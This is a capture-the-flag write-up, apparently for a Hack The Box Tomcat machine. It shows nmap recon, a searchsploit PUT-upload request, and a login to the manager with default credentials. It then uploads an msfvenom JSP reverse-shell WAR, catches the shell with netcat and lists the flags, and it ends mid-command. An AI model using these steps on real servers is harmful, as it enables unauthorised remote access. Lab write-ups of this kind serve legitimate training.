# recon
- port 8080: 
  - Apache-Coyote/1.1
  - apache tomcat 7/7.0.88
```console
kali@kali:~/script$ sudo ./pymap.py -t jerry.htb -A -s vuln
[sudo] password for kali: 
                                                    
@@@@@@@   @@@ @@@  @@@@@@@@@@    @@@@@@   @@@@@@@  
@@@@@@@@  @@@ @@@  @@@@@@@@@@@  @@@@@@@@  @@@@@@@@  
@@!  @@@  @@! !@@  @@! @@! @@!  @@!  @@@  @@!  @@@  
!@!  @!@  !@! @!!  !@! !@! !@!  !@!  @!@  !@!  @!@  
@!@@!@!    !@!@!   @!! !!@ @!@  @!@!@!@!  @!@@!@!   
!!@!!!      @!!!   !@!   ! !@!  !!!@!!!!  !!@!!!    
!!:         !!:    !!:     !!:  !!:  !!!  !!:       
:!:         :!:    :!:     :!:  :!:  !:!  :!:       
 ::          ::    :::     ::   ::   :::   ::       
 :           :      :      :     :   : :   :        
Author: kuroHat
Github: https://github.com/gu2rks


port scanning...
8080/tcp open  http-proxy
Enumerating open ports...
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-24 10:04 EDT
Nmap scan report for jerry.htb (10.10.10.95)
Host is up (0.038s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
|_http-server-header: Apache-Coyote/1.1
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```
- searchsploit
```console
kali@kali:~$ searchsploit Apache Tomcat 7.0
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Apache Tomcat 7.0.4 - 'sort' / 'orderBy' Cross-Site Scripting        | linux/remote/35011.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP U | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP U | windows/webapps/42953.txt
--------------------------------------------------------------------- ---------------------------------

kali@kali:~$ searchsploit -x windows/webapps/42953.txt

PUT /1.jsp/ HTTP/1.1
Host: jerry.htb:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://jerry.htb:8080/examples/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2
Cookie: JSESSIONID=A27674F21B3308B4D893205FD2E2BF94
Connection: close
Content-Length: 26

<% out.println("hello");%>
```
- https://www.cvedetails.com/cve/CVE-2017-12617/#metasploit I tried both while waiting for result from gobuster.
- gobuster
```
/aux (Status: 200)
/com1 (Status: 200)
/com2 (Status: 200)
/com4 (Status: 200)
/com3 (Status: 200)
/con (Status: 200)
/docs (Status: 302)
/examples (Status: 302)
/favicon.ico (Status: 200)
/index.jsp (Status: 200)
/lpt1 (Status: 200)
/lpt2 (Status: 200)
/manager (Status: 302)
/nul (Status: 200)
/prn (Status: 200)
```
bing go we find the login page for tomcat. `/manager/html` let try to log in with defualt credential!.
```htm
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```
BOOM we are in. in manager page, note that you are able to upload .war file. The plan is create a reverse-shell.war. Upload it here visite the it to force the server to execute the shell

let generate .war rev shell
```console
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=6969 -f war > kuro.war
```
now open netcat listen on the given port and visite `/kuro`.


Boom, now go grab your flags
```
 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,599,106,048 bytes free

```

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
```
